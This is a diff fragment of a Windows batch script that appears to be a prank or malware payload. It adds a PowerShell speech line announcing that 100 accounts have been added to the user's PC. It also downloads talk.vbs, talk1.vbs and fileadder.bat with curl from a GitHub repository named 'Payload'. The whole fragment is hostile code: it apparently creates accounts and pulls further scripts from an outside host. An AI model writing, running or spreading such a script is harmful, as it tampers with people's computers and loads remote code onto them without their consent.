@@ -23,6 +23,7 @@ Set /a loop += 1
 goto loopstart
 
 :done
+PowerShell -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.SelectVoice('Microsoft David Desktop'); $speak.Speak('hello user we have just added 100 accounts to your pc')"
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk.vbs
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk1.vbs
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/fileadder.bat
